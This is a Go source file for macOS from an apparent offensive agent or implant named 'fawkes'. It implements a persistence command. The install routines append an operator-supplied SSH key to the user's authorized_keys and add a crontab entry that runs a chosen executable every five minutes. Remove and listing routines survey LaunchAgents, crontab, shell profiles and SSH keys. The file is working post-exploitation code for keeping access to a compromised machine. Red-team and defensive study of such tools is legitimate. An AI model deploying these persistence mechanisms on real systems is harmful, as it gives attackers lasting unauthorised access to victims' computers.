//go:build darwin
// +build darwin

package commands

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// persistSSHKey — shared implementation (same as Linux)
func persistSSHKey(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistSSHKeyInstall(args)
	case "remove":
		return persistSSHKeyRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistSSHKeyInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (SSH public key string) is required")
	}

	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	targetHome, _ := os.UserHomeDir()
	sshDir := filepath.Join(targetHome, ".ssh")
	os.MkdirAll(sshDir, 0700)
	authKeysPath := filepath.Join(sshDir, "authorized_keys")

	existing, _ := os.ReadFile(authKeysPath)
	if strings.Contains(string(existing), marker) {
		return errorf("authorized_keys already contains marker '%s'. Remove first.", marker)
	}

	keyLine := fmt.Sprintf("%s %s\n", strings.TrimSpace(args.Path), marker)

	f, err := os.OpenFile(authKeysPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return errorf("Failed to open %s: %v", authKeysPath, err)
	}
	defer f.Close()

	if _, err := f.WriteString(keyLine); err != nil {
		return errorf("Failed to write to %s: %v", authKeysPath, err)
	}

	return successResult(fmt.Sprintf("SSH key persistence installed:\n  File: %s\n  Marker: %s\n\nRemove with: persist -method ssh-key -action remove -name %s", authKeysPath, marker, marker))
}

func persistSSHKeyRemove(args persistArgs) structs.CommandResult {
	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	targetHome, _ := os.UserHomeDir()
	authKeysPath := filepath.Join(targetHome, ".ssh", "authorized_keys")
	data, err := os.ReadFile(authKeysPath)
	if err != nil {
		return errorf("Failed to read %s: %v", authKeysPath, err)
	}

	lines := strings.Split(string(data), "\n")
	var filtered []string
	removed := 0
	for _, line := range lines {
		if strings.Contains(line, marker) {
			removed++
			continue
		}
		filtered = append(filtered, line)
	}

	if removed == 0 {
		return errorf("No authorized_keys entries found with marker '%s'", marker)
	}

	if err := os.WriteFile(authKeysPath, []byte(strings.Join(filtered, "\n")), 0600); err != nil {
		return errorf("Failed to write %s: %v", authKeysPath, err)
	}

	return successResult(fmt.Sprintf("Removed %d SSH key(s) with marker '%s' from %s", removed, marker, authKeysPath))
}

// persistCrontab — macOS also supports crontab
func persistCrontab(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistCrontabInstall(args)
	case "remove":
		return persistCrontabRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistCrontabInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (executable to persist) is required")
	}
	if args.Schedule == "" {
		args.Schedule = "*/5 * * * *"
	}

	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}
	cronLine := fmt.Sprintf("%s %s # %s", args.Schedule, args.Path, marker)

	var currentCrontab string
	cmd := exec.Command("crontab", "-l")
	output, err := cmd.CombinedOutput()
	if err != nil {
		currentCrontab = ""
	} else {
		currentCrontab = string(output)
	}

	if strings.Contains(currentCrontab, marker) {
		return errorf("Crontab entry with marker '%s' already exists. Remove first.", marker)
	}

	newCrontab := currentCrontab
	if !strings.HasSuffix(newCrontab, "\n") && newCrontab != "" {
		newCrontab += "\n"
	}
	newCrontab += cronLine + "\n"

	installCmd := exec.Command("crontab", "-")
	installCmd.Stdin = strings.NewReader(newCrontab)
	if out, err := installCmd.CombinedOutput(); err != nil {
		return errorf("Failed to install crontab: %v\n%s", err, string(out))
	}

	return successResult(fmt.Sprintf("Crontab persistence installed:\n  Schedule: %s\n  Command: %s\n  Marker: %s", args.Schedule, args.Path, marker))
}

func persistCrontabRemove(args persistArgs) structs.CommandResult {
	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	cmd := exec.Command("crontab", "-l")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return errorResult("No crontab entries found")
	}

	lines := strings.Split(string(output), "\n")
	var filtered []string
	removed := 0
	for _, line := range lines {
		if strings.Contains(line, "# "+marker) {
			removed++
			continue
		}
		filtered = append(filtered, line)
	}

	if removed == 0 {
		return errorf("No crontab entries found with marker '%s'", marker)
	}

	installCmd := exec.Command("crontab", "-")
	installCmd.Stdin = strings.NewReader(strings.Join(filtered, "\n"))
	if out, err := installCmd.CombinedOutput(); err != nil {
		return errorf("Failed to update crontab: %v\n%s", err, string(out))
	}

	return successResult(fmt.Sprintf("Removed %d crontab entry/entries with marker '%s'", removed, marker))
}

// persistDarwinList lists installed persistence mechanisms
func persistDarwinList() structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== INSTALLED PERSISTENCE (macOS) ===\n\n")

	// LaunchAgents
	home, _ := os.UserHomeDir()
	agentDirs := []string{
		filepath.Join(home, "Library", "LaunchAgents"),
		"/Library/LaunchAgents",
		"/Library/LaunchDaemons",
	}

	for _, dir := range agentDirs {
		sb.WriteString(fmt.Sprintf("[%s]\n", dir))
		entries, err := os.ReadDir(dir)
		if err != nil {
			sb.WriteString("  (not accessible)\n")
			continue
		}
		count := 0
		for _, e := range entries {
			if strings.HasSuffix(e.Name(), ".plist") && !strings.HasPrefix(e.Name(), "com.apple.") {
				sb.WriteString(fmt.Sprintf("  %s\n", e.Name()))
				count++
			}
		}
		if count == 0 {
			sb.WriteString("  (no custom plists)\n")
		}
	}

	// Crontab
	sb.WriteString("\n[Crontab]\n")
	cmd := exec.Command("crontab", "-l")
	if output, err := cmd.CombinedOutput(); err == nil {
		lines := strings.Split(string(output), "\n")
		for _, line := range lines {
			if strings.TrimSpace(line) != "" && !strings.HasPrefix(strings.TrimSpace(line), "#") {
				sb.WriteString(fmt.Sprintf("  %s\n", line))
			}
		}
	} else {
		sb.WriteString("  (no crontab)\n")
	}

	// Shell profiles
	sb.WriteString("\n[Shell Profile Persistence]\n")
	profiles := []string{".zshrc", ".zshenv", ".zprofile", ".bashrc", ".bash_profile", ".profile"}
	found := false
	for _, p := range profiles {
		path := filepath.Join(home, p)
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		if strings.Contains(string(data), "# BEGIN ") {
			sb.WriteString(fmt.Sprintf("  %s: contains persistence markers\n", path))
			found = true
		}
	}
	if !found {
		sb.WriteString("  (none found)\n")
	}

	// SSH keys
	sb.WriteString("\n[SSH Authorized Keys]\n")
	authKeys := filepath.Join(home, ".ssh", "authorized_keys")
	if data, err := os.ReadFile(authKeys); err == nil {
		lines := strings.Split(string(data), "\n")
		count := 0
		for _, line := range lines {
			if strings.TrimSpace(line) != "" {
				count++
			}
		}
		sb.WriteString(fmt.Sprintf("  %s: %d keys\n", authKeys, count))
	} else {
		sb.WriteString("  (no authorized_keys)\n")
	}

	return successResult(sb.String())
}
